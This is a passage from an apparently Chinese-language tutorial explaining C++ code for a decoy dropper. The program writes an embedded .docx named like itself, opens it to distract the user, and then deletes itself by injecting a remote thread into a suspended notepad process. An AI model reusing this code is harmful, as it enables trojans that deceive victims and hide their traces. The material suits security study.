<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strcpy_s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strrchr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(PathFileName, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">/*</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">strrchr得到第二个参数最后出现的位置</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">d:\\\\xxxxx\\\\xxxxxx\\\\xxxx.exe在执行后得到\\\\xxxx.exe</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">所以需要+1把\\\\去掉</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">最后得到了完整的文件名</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">用strcpy_s把文件名复制到FileName中</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">*/</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> MAX_PATH; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;.&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;d&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;o&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;c&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;x&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        break</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>先使用 <code>strrchr</code> 函数找到路径中最后一个反斜杠的位置，然后使用 <code>strcpy_s</code> 函数将路径中的文件名部分复制到 <code>FileName</code> 中。接着，遍历 <code>FileName</code>，找到文件名中的 <code>.</code>，将其后的字符改为 <code>docx</code>，以更改文件</p><p>这里 <code>FileName</code> 字符数组的大小还是蛮大的, 后缀修改为 <code>docx</code> 后还有多余的数组空间, 为了避免编码等问题导致的文件名异常, 最好还是加一行</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  // 添加空字符终止字符串</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>创建文件并写入资源内容</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HANDLE FILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, FILE_ALL_ACCESS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, CREATE_ALWAYS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD dwSize;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FILE, PFILE, FileSize, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dwSize, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用 <code>CreateFileA</code> 函数创建一个与当前可执行文件同名的 <code>.docx</code> 文件，并使用 <code>WriteFile</code> 函数将资源内容写入该文件。</p><hr><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191533669.png" alt="image-20240719153356457"></p><ul><li><p><code>lpFileName</code>: 文件名或设备名，作为文件创建或打开的目标</p><p>这里是 <code>FileName</code>，即前面修改了后缀的文件名</p></li><li><p><code>dwDesiredAccess</code>: 指定所请求的访问权限</p><p><code>FILE_ALL_ACCESS</code> 代表对文件的完全访问权限。</p></li><li><p><code>dwShareMode</code>: 指定文件共享模式</p><p><code>0</code> 表示文件不能被其他进程共享，独占访问</p></li><li><p><code>lpSecurityAttributes</code>: 一个指向 <code>SECURITY_ATTRIBUTES</code> 结构的指针，指定文件的安全属性</p><p><code>NULL</code> 表示默认安全属性</p></li><li><p><code>dwCreationDisposition</code>: 指定如何创建文件</p><p><code>CREATE_ALWAYS</code> 表示如果文件存在，将覆盖旧文件，如果文件不存在，将创建新文件</p></li><li><p><code>dwFlagsAndAttributes</code>: 指定文件或设备的属性和标志</p><p><code>0</code> 表示使用默认属性。</p></li><li><p><code>hTemplateFile</code>: 用于创建文件的模板文件的句柄</p><p><code>NULL</code> 表示不使用模板。</p></li></ul><p>如果函数成功，返回一个文件句柄，用于后续的文件操作。</p><p>如果函数失败，返回 <code>INVALID_HANDLE_VALUE</code>，可以通过 <code>GetLastError</code> 函数获取错误信息。</p><hr><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191545205.png" alt="image-20240719154513997"></p><p><code>DWORD</code> 是在 Windows 编程中常用的类型，定义在 Windows 头文件中，表示 32 位无符号整数。</p><p><code>DWORD</code> 类型的变量可以存储从 0 到 4,294,967,295 的整数。</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD dwSize;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FILE, PFILE, FileSize, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dwSize, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191537421.png" alt="image-20240719153743173"></p><ul><li><p><code>hFile</code>: 文件句柄，由 <code>CreateFile</code> 返回, 这里是 <code>FILE</code>。</p></li><li><p><code>lpBuffer</code>: 指向要写入文件的数据缓冲区。这里是前面 <code>LockResource</code> 返回的 <code>PFILE</code>，即资源数据指针</p></li><li><p><code>nNumberOfBytesToWrite</code>: 要写入文件的字节数。这里是前面 <code>SizeofResource</code> 返回的 <code>FileSize</code>，即资源文件的大小</p></li><li><p><code>lpNumberOfBytesWritten</code>: 一个指向变量的指针，该变量接收实际写入的字节数, 这里是 <code>&amp;dwSize</code>。</p></li><li><p><code>lpOverlapped</code>: 一个指向 <code>OVERLAPPED</code> 结构的指针，用于异步操作。</p><p><code>NULL</code> 表示同步写入</p></li></ul><p>如果函数成功，返回非零值，并且 <code>lpNumberOfBytesWritten</code> 接收实际写入的字节数。</p></li></ul><hr><h4 id="打开-docx-文件" tabindex="-1"><a class="header-anchor" href="#打开-docx-文件"><span>打开 .docx 文件</span></a></h4><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 2. 打开 .docx 文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">SHELLEXECUTEINFOA shellexecute </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cbSize</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(shellexecute);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">lpFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> FileName;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">nShow</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SW_SHOW;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ShellExecuteExA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">shellexecute);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用 <code>SHELLEXECUTEINFOA</code> 结构体和 <code>ShellExecuteExA</code> 函数打开 <code>.docx</code> 文件。</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">SHELLEXECUTEINFOA shellexecute </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>SHELLEXECUTEINFOA</code> 是一个结构体，用于存储执行操作所需的参数。</p><p><code>= { 0 }</code> 用于将结构体的所有成员初始化为零。</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cbSize</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(shellexecute);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>cbSize</code> 成员表示结构体的大小，以字节为单位。必须正确设置此值，Windows API 才能正确解析结构体内容。</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">lpFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> FileName;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>lpFile</code> 成员是一个指向要操作的文件或程序名的指针。这里设置为 <code>FileName</code>，即之前创建和写入的 <code>.docx</code> 文件名</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">nShow</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SW_SHOW;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>nShow</code> 成员指定应用程序窗口的显示方式。<code>SW_SHOW</code> 表示窗口将被显示并激活。</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ShellExecuteExA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">shellexecute);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>ShellExecuteExA</code> 函数使用 <code>shellexecute</code> 结构体中的参数执行与指定文件关联的默认操作。</p><hr><h4 id="实现自删除" tabindex="-1"><a class="header-anchor" href="#实现自删除"><span>实现自删除</span></a></h4><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 3. 实现自删除</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//下面是实现自删除，网上的自删除方法有很多，用的多的是批处理，这里是创建一个进程然后用远程线程注入来让notepad删除当前程序</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">STARTUPINFOA si </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">PROCESS_INFORMATION  pi </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CreateProcessA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;c:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">windows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">system32</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">notepad.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, TRUE, CREATE_NO_WINDOW </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">|</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> CREATE_SUSPENDED, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">si, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pi);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//创建进程</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DeleteStruct DS;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> GetProcAddress</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleHandleA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;kernel32.dll&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DeleteFileA&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MAX_PATH);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//创建远程线程不能直接使用API，需要把函数指针放在结构中传过去</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//这里需要DeleteFileA这个函数，用GetProcAddress得到指针后传过去</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LPVOID ADDRESS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, ADDRESS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">threadProc, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
